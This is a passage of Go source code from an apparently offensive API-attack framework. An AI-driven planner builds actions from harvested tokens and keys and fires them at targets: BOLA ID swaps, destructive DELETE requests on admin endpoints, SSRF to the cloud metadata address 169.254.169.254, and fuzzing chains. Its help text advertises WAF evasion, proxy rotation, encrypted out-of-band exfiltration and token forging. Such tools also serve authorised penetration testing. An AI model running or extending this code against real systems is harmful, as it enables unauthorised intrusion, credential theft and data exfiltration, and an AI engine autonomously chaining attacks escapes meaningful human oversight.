					Payload:    "Authorization: Bearer <attacker_jwt>",
					Confidence: "HIGH",
					Reasoning:  "JWT available + admin endpoint detected. Attempting privilege escalation.",
					Status:     "PENDING",
				})
				id++
				if id > 10 {
					break
				}
			}
		}
	}

	return actions
}

// --- HELPER EXTRACTORS ---

func extractCredentials() []string {
	var creds []string
	for _, finding := range logic.Vault {
		if strings.Contains(finding.Type, "CRED") || strings.Contains(finding.Type, "PASSWORD") {
			creds = append(creds, finding.Value)
		}
	}
	return creds
}

func extractJWTTokens() []string {
	var tokens []string
	if logic.CurrentSession.AttackerToken != "" && strings.Contains(logic.CurrentSession.AttackerToken, ".") {
		tokens = append(tokens, logic.CurrentSession.AttackerToken)
	}
	if logic.CurrentSession.VictimToken != "" && strings.Contains(logic.CurrentSession.VictimToken, ".") {
		tokens = append(tokens, logic.CurrentSession.VictimToken)
	}
	return tokens
}

func extractAPIKeys() []string {
	var keys []string
	for _, finding := range logic.Vault {
		if strings.Contains(finding.Type, "API_KEY") || strings.Contains(finding.Type, "KEY") {
			keys = append(keys, finding.Value)
		}
	}
	return keys
}

func extractAWSKeys() []string {
	var keys []string
	for _, finding := range logic.Vault {
		if strings.Contains(finding.Type, "AWS") || strings.Contains(finding.Type, "AKID") {
			keys = append(keys, finding.Value)
		}
	}
	return keys
}

// GenerateStrategicPlan simulates the AI Planner by aggregating F2, F3, and F4 data
func GenerateStrategicPlan() {
	ActionBuffer = []TacticalAction{} // Reset buffer

	// 1. INGESTION: Get Discovery Map (F2)
	endpoints := logic.GlobalDiscovery.GetEndpoints()
	if len(endpoints) == 0 {
		utils.TacticalLog("[yellow]Telemetry Empty: Run 'map' or 'swagger' to populate discovery map.[-]")
		return
	}

	// 2. INGESTION: Get Loot Summary (F3)
	loot := logic.GetLootSummary()

	// 3. INGESTION: Get Traffic History (F4)
	traffic := logic.GetTrafficHistory()

	utils.TacticalLog(fmt.Sprintf("[blue]STRATEGY:[-] Scanning %d endpoints. Auth=%v, AWS=%v...", len(endpoints), loot.HasJWT, loot.HasAWS))

	id := 1

	// 4. HEURISTIC STATE MACHINE
	for _, ep := range endpoints {
		if id > 10 {
			break
		}
		fullTarget := logic.CurrentSession.GetTarget() + ep
		lastStatus, hasHistory := traffic[ep]

		// HEURISTIC A: BOLA (Broken Object Level Auth)
		// Logic: Endpoint has {id} param + We have a Token (to try swapping)
		if strings.Contains(ep, "{id}") || strings.Contains(ep, "/user/") || strings.Contains(ep, "/order/") {
			conf := "MEDIUM"
			reason := "Endpoint accepts numeric/UUID IDs. Potential IDOR."
			if loot.HasJWT {
				conf = "HIGH"
				reason += " Auth Token available for privilege context swap."
			}

			ActionBuffer = append(ActionBuffer, TacticalAction{
				ID:         id,
				Type:       "BOLA",
				Target:     fullTarget,
				Payload:    "ID: 1337", // Default placeholder
				Confidence: conf,
				Reasoning:  reason,
				Status:     "PENDING",
			})
			id++
			continue
		}

		// HEURISTIC B: BFLA / Admin Bypass
		// Logic: Endpoint is /admin + (No Auth OR 403 Forbidden History)
		isProtected := strings.Contains(strings.ToLower(ep), "admin") || strings.Contains(strings.ToLower(ep), "config")
		if isProtected {
			conf := "HIGH"
			reason := "High-value administrative target detected."

			if hasHistory && lastStatus == 403 {
				conf = "CRITICAL"
				reason += " Confirmed 403 Forbidden. Target is active and protected."
			}

			ActionBuffer = append(ActionBuffer, TacticalAction{
				ID:         id,
				Type:       "BFLA",
				Target:     fullTarget,
				Payload:    "Method: DELETE", // Try destructive method
				Confidence: conf,
				Reasoning:  reason,
				Status:     "PENDING",
			})
			id++
			continue
		}

		// HEURISTIC C: SSRF / Cloud Pivot
		// Logic: Endpoint has 'url' param + AWS Keys found in Loot
		if strings.Contains(strings.ToLower(ep), "url") || strings.Contains(strings.ToLower(ep), "webhook") {
			conf := "MEDIUM"
			reason := "Callback parameter detected."
			if loot.HasAWS {
				conf = "CRITICAL" // If we already have keys, SSRF allows deeper pivot
				reason += " AWS Keys already compromised; verify Metadata access."
			}

			ActionBuffer = append(ActionBuffer, TacticalAction{
				ID:         id,
				Type:       "SSRF",
				Target:     fullTarget,
				Payload:    "169.254.169.254",
				Confidence: conf,
				Reasoning:  reason,
				Status:     "PENDING",
			})
			id++
			continue
		}
	}

	if len(ActionBuffer) == 0 {
		utils.TacticalLog("[yellow]STRATEGY:[-] No high-probability vectors identified in current map.[-]")
	} else {
		utils.TacticalLog(fmt.Sprintf("[green]STRATEGY:[-] Plan Generated. %d Actions Buffered. Review in Tab F5.[-]", len(ActionBuffer)))
	}
}

// ComprehensiveAnalysis performs a multi-pass analysis combining heuristics, AI, and telemetry
// This function aggregates data from pkg/logic/store, pkg/logic/network, and discovery
// and feeds it to the neuro_engine for tactical decision-making. This is the core
// intelligence gathering function for the strategic planner.
// === SPRINT 11: Enhanced with DDI (Dynamic Dependency Injection) ===
func ComprehensiveAnalysis() []TacticalAction {
	var actions []TacticalAction

	// === DDI: PULL ALL TELEMETRY SILOS ===
	silo := AggregateDataSilo()
	utils.TacticalLog("[magenta]ANALYSIS:[-] Dynamic Dependency Injection: Aggregating all telemetry silos (F1-F4)...")

	// Phase 1: Ingest Discovery Data (F2)
	endpoints := silo.F2_Discovery.Endpoints
	if len(endpoints) == 0 {
		utils.TacticalLog("[yellow]ANALYSIS:[-] No endpoints discovered. Run 'map', 'swagger', or 'scrape' first.[-]")

		// ✅ NEW: Provide hint actions to guide user
		hintActions := []TacticalAction{
			{
				ID:         1,
				Type:       "HINT: DISCOVERY",
				Target:     "N/A - Start reconnaissance",
				Payload:    "Run 'map <url>' or 'swagger <openapi-url>' to discover endpoints",
				Confidence: "MEDIUM",
				Status:     "PENDING",
			},
			{
				ID:         2,
				Type:       "HINT: SPIDERING",
				Target:     "N/A - Explore application",
				Payload:    "Run 'scrape <url>' to extract links from HTML responses",
				Confidence: "MEDIUM",
				Status:     "PENDING",
			},
			{
				ID:         3,
				Type:       "HINT: TRAFFIC",
				Target:     "F4 Tab - Intercept requests",
				Payload:    "Enable Interceptor (Ctrl+I) and press Ctrl+A to analyze traffic snapshots",
				Confidence: "LOW",
				Status:     "PENDING",
			},
		}

		utils.TacticalLog("[blue]INFO:[-] Strategic buffer populated with discovery workflow hints.")
		utils.TacticalLog("[cyan]TIP:[-] Check F5 tab for guided next steps to begin reconnaissance.")

		return hintActions
	}

	utils.TacticalLog(fmt.Sprintf("[blue]ANALYSIS:[-] Phase 1 Complete: %d endpoints discovered.[-]", len(endpoints)))

	// Phase 2: Ingest Loot Summary (F3)
	utils.TacticalLog(fmt.Sprintf("[blue]ANALYSIS:[-] Phase 2 Complete: JWT=%d, AWS=%d, Credentials=%d", len(silo.F3_Loot.JWTTokens), len(silo.F3_Loot.AWSKeys), len(silo.F3_Loot.Credentials)))

	// Phase 3: Ingest Traffic History (F4)
	utils.TacticalLog(fmt.Sprintf("[blue]ANALYSIS:[-] Phase 3 Complete: %d HTTP responses cached.[-]", len(silo.F4_Traffic.StatusCodeMap)))

	// === PHASE 4: HEURISTIC STATE MACHINE (with DDI awareness) ===
	heuristicActions := RunAllHeuristics(endpoints, silo.F4_Traffic.StatusCodeMap, logic.GetLootSummary())
	utils.TacticalLog(fmt.Sprintf("[cyan]ANALYSIS:[-] Heuristic Pass: %d actions generated.[-]", len(heuristicActions)))
	actions = append(actions, heuristicActions...)

	// === PHASE 5: CROSS-SILO STATE MACHINE ===
	utils.TacticalLog("[magenta]ANALYSIS:[-] Cross-Silo Evaluation: Detecting advanced attack chains...[-]")
	stateActions := ProcessHeuristicStateMachine(silo)
	utils.TacticalLog(fmt.Sprintf("[magenta]ANALYSIS:[-] Advanced Chains: %d actions generated.[-]", len(stateActions)))
	actions = append(actions, stateActions...)

	// === PHASE 6: NEURAL PASS (if enabled) ===
	if neuro := logic.GetGlobalNeuro(); neuro != nil && neuro.Active {
		utils.TacticalLog("[magenta]ANALYSIS:[-] Neural Pass: Engaging AI for contextual analysis...[-]")
		aiActions := GlobalNeuroCore.ComprehensiveAnalysis(endpoints, logic.GetLootSummary(), silo.F4_Traffic.StatusCodeMap)
		utils.TacticalLog(fmt.Sprintf("[magenta]ANALYSIS:[-] Neural Pass: %d AI-generated actions.[-]", len(aiActions)))

		// Merge AI actions, avoiding duplicates
		for _, aiAction := range aiActions {
			isDuplicate := false
			for _, existing := range actions {
				if existing.Type == aiAction.Type && existing.Target == aiAction.Target {
					isDuplicate = true
					break
				}
			}
			if !isDuplicate && len(actions) < 20 {
				actions = append(actions, aiAction)
			}
		}

		// === PHASE 6B: FUZZING RECOMMENDATIONS (AI-driven Intruder suggestions) ===
		utils.TacticalLog("[magenta]ANALYSIS:[-] Fuzzing Analysis: Getting AI-recommended Intruder attacks...[-]")
		// Get last captured request for analysis
		if lastReq := GetLastCapturedRequest(); lastReq != "" {
			fuzzActions := GlobalNeuroCore.AnalyzeForFuzzing(lastReq)
			utils.TacticalLog(fmt.Sprintf("[magenta]ANALYSIS:[-] Fuzzing Pass: %d AI-recommended Intruder actions.[-]", len(fuzzActions)))

			// Add fuzzing actions to buffer
			for _, fuzzAction := range fuzzActions {
				isDuplicate := false
				for _, existing := range actions {
					if existing.Type == "INTRUDER" && existing.Target == fuzzAction.Target && existing.Payload == fuzzAction.Payload {
						isDuplicate = true
						break
					}
				}
				if !isDuplicate && len(actions) < 20 {
					actions = append(actions, fuzzAction)
				}
			}
		}
	}

	// Phase 7: Score and Sort by Confidence
	confidenceMap := map[string]int{"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}
	for i := range actions {
		actions[i].ID = i + 1
	}

	// Sort descending by confidence
	for i := 0; i < len(actions)-1; i++ {
		for j := i + 1; j < len(actions); j++ {
			if confidenceMap[actions[j].Confidence] > confidenceMap[actions[i].Confidence] {
				actions[i], actions[j] = actions[j], actions[i]
			}
		}
	}

	utils.TacticalLog(fmt.Sprintf("[green]ANALYSIS:[-] Complete. Total Actions: %d (Sorted by Confidence). F1=%v, F2=%d, F3=%d, F4=%d",
		len(actions), silo.F1_DashboardStatus.NeuroEngineActive, len(silo.F2_Discovery.Endpoints), silo.F3_Loot.TotalFindings, len(silo.F4_Traffic.StatusCodeMap)))

	return actions
}

// ExecuteStrategicPlan runs the approved actions from the buffer
// === SPRINT 11.4: ENHANCED WITH REAL-TIME STATUS UPDATES ===
func ExecuteStrategicPlan() {
	count := 0
	for i, act := range ActionBuffer {
		if act.Status != "PENDING" {
			continue
		}

		utils.TacticalLog(fmt.Sprintf("[magenta]EXEC STRATEGY #%d:[-] %s on %s", act.ID, act.Type, act.Target))
		utils.LogContext(fmt.Sprintf("[blue]>>> FIRING:[-] %s with payload: %s", act.Type, act.Payload))

		ActionBuffer[i].Status = "EXECUTED"
		count++

		// Fire Async to not block the loop
		go func(a TacticalAction, idx int) {
			time.Sleep(300 * time.Millisecond) // Stagger for rate limiting

			// === SPRINT 11.4: UPDATE F5 TABLE WITH STATUS ===
			startTime := time.Now()

			switch a.Type {
			case "BOLA":
				utils.LogContext("[yellow]BOLA PROBE:[-] Testing ID-based authorization bypass...")
				// Payload format "ID: <val>"
				parts := strings.Split(a.Payload, ":")
				victim := "1"
				if len(parts) > 1 {
					victim = strings.TrimSpace(parts[1])
				}
				ctx := &logic.BOLAContext{BaseURL: a.Target, VictimID: victim}
				ctx.ProbeSilent()
				utils.LogContext(fmt.Sprintf("[green]✓ BOLA COMPLETE:[-] %v", time.Since(startTime)))

			case "BFLA":
				utils.LogContext("[yellow]BFLA PROBE:[-] Testing method tampering...")
				req, _ := http.NewRequest("DELETE", a.Target, nil)
				logic.SafeDo(req, false, "STRATEGY-BFLA")
				utils.LogContext(fmt.Sprintf("[green]✓ BFLA COMPLETE:[-] %v", time.Since(startTime)))

			case "SSRF":
				utils.LogContext("[yellow]SSRF PROBE:[-] Attempting internal endpoint access...")
				ctx := &logic.SSRFContext{TargetURL: a.Target, ParamName: "url", Callback: "127.0.0.1"}
				ctx.Probe()
				utils.LogContext(fmt.Sprintf("[green]✓ SSRF COMPLETE:[-] %v", time.Since(startTime)))

			case "CLOUD_PIVOT":
				utils.LogContext("[yellow]CLOUD PIVOT:[-] Attempting AWS metadata extraction...")
				req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
				logic.SafeDo(req, false, "STRATEGY-CLOUD")
				utils.LogContext(fmt.Sprintf("[green]✓ CLOUD PIVOT COMPLETE:[-] %v", time.Since(startTime)))

			case "LATERAL_MOVEMENT":
				utils.LogContext("[yellow]LATERAL MOVEMENT:[-] Pivoting to internal endpoint...")
				req, _ := http.NewRequest("GET", a.Target, nil)
				logic.SafeDo(req, false, "STRATEGY-LATERAL")
				utils.LogContext(fmt.Sprintf("[green]✓ LATERAL COMPLETE:[-] %v", time.Since(startTime)))

			case "INTRUDER":
				utils.LogContext("[yellow]AI INTRUDER:[-] AI-recommended single-position fuzzing attack...")
				// Payload format "param:category"
				parts := strings.Split(a.Payload, ":")
				if len(parts) == 2 {
					param := parts[0]
					category := parts[1]
					// Get embedded payloads for this category
					payloads := attack.GetInternalWordlist(category)
					if len(payloads) > 0 {
						config := attack.IntruderConfig{
							TargetURL:   a.Target,
							Param:       param,
							PayloadList: payloads,
							Concurrency: 3,
							Mode:        attack.Sniper,
						}
						attack.RunSniper(config)
						utils.LogContext(fmt.Sprintf("[green]✓ AI INTRUDER COMPLETE:[-] %s fuzzing on '%s' executed. %v", category, param, time.Since(startTime)))
					}
				}

			default:
				utils.LogContext("[yellow]GENERIC PROBE:[-] Testing endpoint...")
				// Generic
				req, _ := http.NewRequest("GET", a.Target, nil)
				logic.SafeDo(req, false, "STRATEGY-GENERIC")
				utils.LogContext(fmt.Sprintf("[green]✓ PROBE COMPLETE:[-] %v", time.Since(startTime)))
			}

			// Mark as executed with timestamp
			ActionBuffer[idx].Status = "EXECUTED"
			utils.LogContext(fmt.Sprintf("[cyan]Result:[-] Action %d execution time: %v", a.ID, time.Since(startTime)))
		}(act, i)
	}

	if count == 0 {
		utils.TacticalLog("[gray]No PENDING actions to commit.[-]")
	} else {
		utils.TacticalLog(fmt.Sprintf("[green]Strategic Batch Committed: %d actions fired.[-]", count))
		utils.LogContext(fmt.Sprintf("[magenta]>>> BATCH COMMIT:[-] %d actions queued for execution.", count))
	}
}

// === SPRINT 11.2: ProcessChain - Full Autonomy Execution ===
// ProcessChain executes a sequence of tactical actions with precondition validation
// Chains are automatically triggered when prerequisites are met (loot from prior actions)
// SPRINT 11.3 PATCH: Added write-through synchronization barrier to prevent "Race to the Silo"
func ProcessChain(chainID string) {
	utils.TacticalLog(fmt.Sprintf("[magenta]CHAIN:[-] Processing autonomous chain '%s'", chainID))
	utils.LogContext(fmt.Sprintf("[cyan]>>> CHAIN EXECUTION:[-] Starting chain '%s'", chainID))

	// Filter ActionBuffer to get only actions for this chain
	chainActions := make([]TacticalAction, 0)
	for _, act := range ActionBuffer {
		if act.ChainID == chainID {
			chainActions = append(chainActions, act)
		}
	}

	if len(chainActions) == 0 {
		utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] No actions found for chain '%s'", chainID))
		return
	}

	utils.LogContext(fmt.Sprintf("[blue]Found %d actions in chain '%s'", len(chainActions), chainID))

	// Execute actions sequentially with precondition validation AND write-through barrier
	var wg sync.WaitGroup
	for i, act := range chainActions {
		// CRITICAL: Use WaitGroup to implement write-through cache barrier
		// This ensures DataSilo.Set() completes BEFORE next action's PreCondition check
		// Prevents "Race to the Silo" where Step B checks precondition before Step A commits loot

		// Check precondition before execution
		if act.PreCondition != "" {
			if !logic.GlobalDataSilo.Exists(act.PreCondition) {
				utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] Skipping action %d: PreCondition '%s' not met", act.ID, act.PreCondition))
				utils.LogContext(fmt.Sprintf("[red]Precondition failed:[-] '%s' not found in DataSilo", act.PreCondition))
				continue
			}
			utils.LogContext(fmt.Sprintf("[green]✓ Precondition met:[-] '%s' exists in DataSilo", act.PreCondition))
		}

		utils.TacticalLog(fmt.Sprintf("[blue]CHAIN[%d/%d]:[-] Executing %s on %s", i+1, len(chainActions), act.Type, act.Target))
		utils.LogContext(fmt.Sprintf("[magenta]Step %d:[-] %s -> %s", i+1, act.Type, act.Target))

		startTime := time.Now()
		var result string

		// Execute based on action type
		switch act.Type {
		case "BOLA":
			parts := strings.Split(act.Payload, ":")
			victim := "1"
			if len(parts) > 1 {
				victim = strings.TrimSpace(parts[1])
			}
			ctx := &logic.BOLAContext{BaseURL: act.Target, VictimID: victim}
			ctx.ProbeSilent()
			result = fmt.Sprintf("BOLA probe executed on %s", act.Target)

		case "BFLA":
			req, _ := http.NewRequest("DELETE", act.Target, nil)
			resp, err := logic.GlobalClient.Do(req)
			if err != nil {
				result = fmt.Sprintf("BFLA error: %v", err)
			} else {
				result = fmt.Sprintf("BFLA executed, response: %d", resp.StatusCode)
				if resp.Body != nil {
					resp.Body.Close()
				}
			}

		case "SSRF":
			ctx := &logic.SSRFContext{TargetURL: act.Target, ParamName: "url", Callback: "127.0.0.1"}
			ctx.Probe()
			result = fmt.Sprintf("SSRF probe executed on %s", act.Target)

		case "CLOUD_PIVOT":
			req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
			resp, err := logic.GlobalClient.Do(req)
			if err != nil {
				result = fmt.Sprintf("Cloud pivot error: %v", err)
			} else {
				result = fmt.Sprintf("Cloud pivot executed, response: %d", resp.StatusCode)
				if resp.Body != nil {
					resp.Body.Close()
				}
			}

		default:
			req, _ := http.NewRequest("GET", act.Target, nil)
			resp, err := logic.GlobalClient.Do(req)
			if err != nil {
				result = fmt.Sprintf("Generic probe error: %v", err)
			} else {
				result = fmt.Sprintf("Generic probe executed, response: %d", resp.StatusCode)
				if resp.Body != nil {
					resp.Body.Close()
				}
			}
		}

		duration := time.Since(startTime)
		utils.LogContext(fmt.Sprintf("[green]✓ Completed:[-] %s (%v)", result, duration))

		// === WRITE-THROUGH BARRIER (SPRINT 11.3 PATCH) ===
		// Use WaitGroup to implement blocking commit
		// This SYNCHRONOUSLY writes to DataSilo and blocks until completed
		// Next action's PreCondition check CANNOT proceed until this completes
		lootKey := fmt.Sprintf("chain_%s_step_%d_loot", chainID, i)

		wg.Add(1)
		go func(key, value string, index int) {
			defer wg.Done()
			// Synchronous DataSilo.Set() with commit completion
			logic.GlobalDataSilo.Set(key, value)
			utils.LogContext(fmt.Sprintf("[green]✓ DataSilo commit barrier:[-] '%s' persisted (step %d complete)", key, index+1))
		}(lootKey, result, i)

		// BLOCKING: Wait for DataSilo write to complete before proceeding to next action
		// This ensures PreCondition checks on the next loop iteration see committed loot
		wg.Wait()
		utils.LogContext(fmt.Sprintf("[cyan]Synchronization barrier:[-] Step %d loot committed, proceeding to next action", i+1))

		// If this action captured data, update preconditions for subsequent actions
		if act.Loot != "" {
			logic.GlobalDataSilo.Set(act.Loot, result)
			utils.LogContext(fmt.Sprintf("[cyan]Stored:[-] Loot key '%s'", act.Loot))
		}

		// Stagger execution
		time.Sleep(300 * time.Millisecond)
	}

	utils.TacticalLog(fmt.Sprintf("[green]✓ CHAIN COMPLETE:[-] Chain '%s' finished execution", chainID))
	utils.LogContext(fmt.Sprintf("[magenta]>>> CHAIN FINISHED:[-] All steps completed for chain '%s'", chainID))
}

// seedDatabase injects a massive dataset (120+ entries) strictly aligned to VaporTrace Mapping
func seedDatabase() {
	time.Sleep(500 * time.Millisecond)
	findings := []db.Finding{
		{
			Phase: "II. EXPLOIT", Target: "https://api.target.corp/users/1001",
			Details: "BOLA: Accessed administrative user profile via ID manipulation.",
			Status:  "EXPLOITED",
			Command: "bola", OWASP_ID: "API1:2023 BOLA",
			MITRE_ID: "T1594", MitreTactic: "Exfiltration",
			NIST_Tag: "PR.AC", NistControl: "PR.AC-03",
			CVE_ID: "CVE-2024-BOLA", CVSS_Score: "9.1", CVSS_Numeric: 9.1,
		},
		{
			Phase: "III. EXPAND", Target: "https://api.target.corp/hooks/stripe",
			Details: "SSRF: Cloud Metadata (169.254.169.254) keys exfiltrated.",
			Status:  "CRITICAL",
			Command: "ssrf", OWASP_ID: "API7:2023 SSRF",
			MITRE_ID: "T1071.001", MitreTactic: "Command & Control",
			NIST_Tag: "DE.CM", NistControl: "PR.DS-01",
			CVE_ID: "CVE-2021-26855", CVSS_Score: "9.8", CVSS_Numeric: 9.8,
		},
	}
	utils.TacticalLog("[yellow]Seeding Database with enriched findings...[-]")
	for _, f := range findings {
		utils.RecordFinding(f)
		time.Sleep(20 * time.Millisecond)
	}
	utils.TacticalLog("[green]Mission Environment Seeded.[-]")
}

func handleTestCommands(verb string) {
	utils.TacticalLog(fmt.Sprintf("[white]Running Diagnostic: %s (httpbin)...[-]", verb))
	go func() {
		switch verb {
		case "test-bola":
			ctx := &logic.BOLAContext{BaseURL: "https://httpbin.org/anything", VictimID: "999"}
			ctx.ProbeSilent()
		case "test-bopla":
			ctx := &logic.BOPLAContext{TargetURL: "https://httpbin.org/patch", Method: "PATCH", BaseJSON: `{"user":"test"}`}
			ctx.RunFuzzer(1)
		case "test-bfla":
			ctx := &logic.BFLAContext{TargetURL: "https://httpbin.org/anything"}
			ctx.MassProbe(1)
		case "test-exhaust":
			ctx := &logic.ExhaustionContext{TargetURL: "https://httpbin.org/get", ParamName: "limit"}
			ctx.FuzzPagination()
		case "test-ssrf":
			ctx := &logic.SSRFContext{TargetURL: "https://httpbin.org/redirect-to", ParamName: "url", Callback: "http://google.com"}
			ctx.Probe()
		}
	}()
}

func printUsage() {
	utils.TacticalLog("[aqua]TACTICAL COMMAND REFERENCE (Pagination 1/2 - Strategic & Discovery)[-]")
	lines := []string{
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]STRATEGIC PLANNING (Human-in-the-Loop Attack Orchestration)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]analyze[-]          Tactical Plan          Generate attack vector analysis from discovered endpoints.",
		"[yellow]list-plan[-]        View Actions           Display all pending tactical actions from last analysis.",
		"[yellow]edit <id> <pay>[-]  Override Payload       Modify the proposed payload for a specific action.",
		"[yellow]drop <id>[-]        Reject Action          Mark an action as DROPPED (won't execute on commit).",
		"[yellow]commit[-]           Execute All            Fire all PENDING actions with real-time F5/F6 feedback.",
		"[yellow]remediate <type>[-] Auto-Fix               Generate middleware patches for identified vulnerabilities.",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]RECONNAISSANCE & DISCOVERY (Build the Attack Surface Map)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]target <url>[-]     Scope Target           Set the global context URL for all modules.",
		"[yellow]map[-]              Full Recon             Spidering + Swagger mining + JS scraping (auto-pipeline).",
		"[yellow]spider <url>[-]     Web Crawler            Active crawl to extract links, APIs, and JS files from domain.",
		"[yellow]swagger <url>[-]    Parse OpenAPI          Ingest Swagger/OpenAPI JSON specs into the database.",
		"[yellow]scrape <url>[-]     JS Endpoint Mining     Extract API routes from JavaScript bundles.",
		"[yellow]fuzz <url>[-]       Brute Discovery        Hidden paths/params with anomaly detection (params|paths mode).",
		"[yellow]mine <url>[-]       Param Fuzzing          Brute-force hidden query parameters (debug, admin, test).",
		"[yellow]sessions[-]         Auth Context           Display/manage active authentication tokens & cookies.",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]EXPLOIT & ATTACK ENGINES (OWASP API Top 10 Vectors)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]bola <url>[-]       ID Enumeration         Broken Object Level Authorization (Access control bypass).",
		"[yellow]bfla <url>[-]       Method Override        Broken Function Level Authorization (Privilege escalation).",
		"[yellow]bopla <url>[-]      Prop Injection         Broken Object Property Level Auth (Mass assignment).",
		"[yellow]ssrf <url>[-]       Internal Access        SSRF to cloud metadata (169.254.169.254).",
		"[yellow]exhaust <url>[-]    Resource DoS           Test pagination/size limits for resource exhaustion.",
		"[yellow]audit <url>[-]      Config Check           Headers (HSTS), SSL/TLS, CORS policy audit.",
		"[yellow]probe <url>[-]      Webhook Injection      Unsafe consumption in 3rd-party integrations.",
		"[yellow]flow <action>[-]    Attack Chain           (list|clear|run|race) Manage orchestrated attack sequences.",
		"[yellow]intruder <mode>[-]  Fuzzing Engine         (sniper) Automated payload injection against params.",
		"[yellow]race <url>[-]       Race Condition Test    Synchronization gate for TOCTOU vulnerability detection.",
		"[cyan]→ Type 'usage 2' to see Evasion, AI, Infrastructure, and System commands[-]",
	}
	for _, l := range lines {
		utils.TacticalLog(l)
	}
}

func printUsagePage2() {
	utils.TacticalLog("[aqua]TACTICAL COMMAND REFERENCE (Pagination 2/2 - Evasion, AI & System)[-]")
	lines := []string{
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]STEALTH & WAF EVASION (Bypass Detection & Rate Limiting)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]stealth <mode>[-]   Set Mode               Set global evasion strategy (aggressive|fast|silent|debug).",
		"[yellow]stealth off[-]      Kill Switch            Disable all evasion (fastest/most aggressive mode).",
		"[yellow]stealth status[-]   Config View            Display current evasion config + multiplier.",
		"[yellow]stealth toggle[-]   Feature Control        Toggle individual techniques (jitter|thinking|backoff|obfuscation|encoding).",
		"[yellow]stealth multiplier[-] Timing Scale         Scale all delays globally (0.1x-5.0x multiplier).",
		"[yellow]evasion <tech>[-]   Technique Info         Learn about specific evasion technique or view all (evasion status).",
		"[yellow]waf detect[-]       Detection Engine       Display WAF detection patterns and monitored indicators.",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]DATA EXFILTRATION (Encrypted Out-of-Band Channels)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]oob[-]              OOB Config             Manage encrypted OOB exfiltration channels (TCP/DNS/ICMP).",
		"[yellow]loot[-]             Vault Manager          View/manage captured secrets (Keys, Tokens, Creds).",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]ADVANCED EVASION & AI (Ghost Weaver & Neuro Engine)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]weaver[-]           Token Forge            Intercept OIDC tokens and mask data exfiltration.",
		"[yellow]neuro on|off[-]     Enable/Disable AI       Toggle Neural Engine for AI-driven mutations.",
		"[yellow]neuro-gen <n>[-]    AI Payload Gen         Generate n high-entropy payloads via LLM.",
		"[yellow]test-neuro[-]       Engine Diag            Connectivity & latency test to AI provider.",
		"[yellow]ask <prompt>[-]     Free LLM Query         Direct operator-to-AI interaction.",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]INFRASTRUCTURE & PERSISTENCE[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]proxy <host:port>[-] Set Proxy              Configure upstream proxy (Burp, Vivaldi, etc).",
		"[yellow]proxies load [-]    Proxy Rotation         Load proxy list for automated rotation.",
		"[yellow]init_db[-]          Create DB              Initialize SQLite3 backend (first run).",
		"[yellow]seed_db[-]          Fake Data              Inject test vulnerabilities (demo mode).",
		"[yellow]reset_db[-]         Wipe Data              Clear all mission data from database.",
		"[yellow]report[-]           Generate Report        Export findings as Markdown/PDF (9.13 Engine).",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]SYSTEM & UTILITIES[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]tasks[-]            Engine Status          List active threads (Context Aggregator, Neuro, Interceptor).",
		"[yellow]clear[-]            Clear Logs             Wipe the F1 tactical feed.",
		"[yellow]keys[-]             Hotkeys                Display all UI keyboard bindings and shortcuts.",
		"[yellow]usage[-]            Page 1                 Display strategic planning & discovery commands.",
		"[yellow]usage 2[-]          Page 2                 Display evasion, AI, infrastructure & system commands.",
		"[yellow]help <cmd>[-]       Specific Help          Get detailed help for a command (help keys for hotkeys).",
		"[yellow]exit[-]             Graceful Shutdown      Close all engines and terminate VaporTrace.",
		"",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[aqua]INTERACTIVE UI SHORTCUTS (In-terminal Controls)[-]",
		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
		"[yellow]Ctrl + H[-]         Keybindings Popup      Show all hotkeys in a modal (press Esc or Ctrl+H to close).",
	}
	for _, l := range lines {
		utils.TacticalLog(l)
	}
}

func printHelp(cmd string) {
	utils.TacticalLog(fmt.Sprintf("[aqua]MANUAL: %s[-]", cmd))
	switch cmd {
	case "keys":
		utils.TacticalLog("[aqua]GLOBAL KEY BINDINGS & UI CONTROLS[-]")
		keys := []string{
			"[yellow]Ctrl + H[-]    Global    Show this keybindings popup in modal (Esc to close)",
			"[yellow]Ctrl + I[-]    Global    Toggle Interceptor (On/Off)",
			"[yellow]Ctrl + F[-]    Modal     Forward packet to network",
			"[yellow]Ctrl + D[-]    Modal     Drop packet",
			"[yellow]Ctrl + B[-]    Modal     Neuro Brute: Gen payloads for current field",
			"[yellow]Ctrl + S[-]    Modal     Sync: Save to Loot DB",
			"[yellow]Ctrl + A[-]    F4 Tab    Analyze snapshot: Send to AI Brain",
			"[yellow]F1[-]          Global    LOGS tab - Tactical feed & system messages",
			"[yellow]F2[-]          Global    MAP tab - Discovered endpoints & attack surface",
			"[yellow]F3[-]          Global    LOOT tab - Captured secrets & credentials",
			"[yellow]F4[-]          Global    TRAFFIC tab - HTTP requests & responses",
			"[yellow]F5[-]          Global    PLAN tab - Strategic actions & planner",
			"[yellow]F6[-]          Global    NEURO tab - AI engine output & analysis",
